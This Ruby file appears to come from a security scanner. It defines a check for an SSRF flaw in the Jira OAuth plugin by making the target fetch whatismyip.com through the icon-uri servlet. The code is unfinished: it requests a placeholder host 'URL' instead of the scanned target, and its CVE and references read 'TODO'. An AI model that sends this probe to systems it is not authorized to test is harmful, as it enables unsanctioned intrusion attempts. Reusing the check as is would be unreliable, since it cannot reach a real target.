module Intrigue
module Task
class AtlassianJiraOauthPluginSsrf < BaseTask

  def self.metadata
    {
      :name => "vuln/atlassian_jira_oath_plugin_ssrf",
      :pretty_name => "Vuln Check - Atlassian Jira Oauth Plugin SSRF",
      :identifiers => [{ "cve" =>  "TODO" }],
      :authors => ["jcran"],
      :description => "SSRF in jira oauth plugin",
      :references => [
        "TODO"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [ {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} ],
      :allowed_options => [],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    # first, ensure we're fingerprinted
    require_enrichment

    uri = _get_entity_name
    html = http_get_body("https://URL/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.whatismyip.com/")
    
    if html =~ /<title>What Is My IP/ 
      _create_linked_issue("atlassian_jira_oauth_plugin_ssrf", {
        proof: {
          response_body: html
        }
      })
    end
    
  end

end
end
end
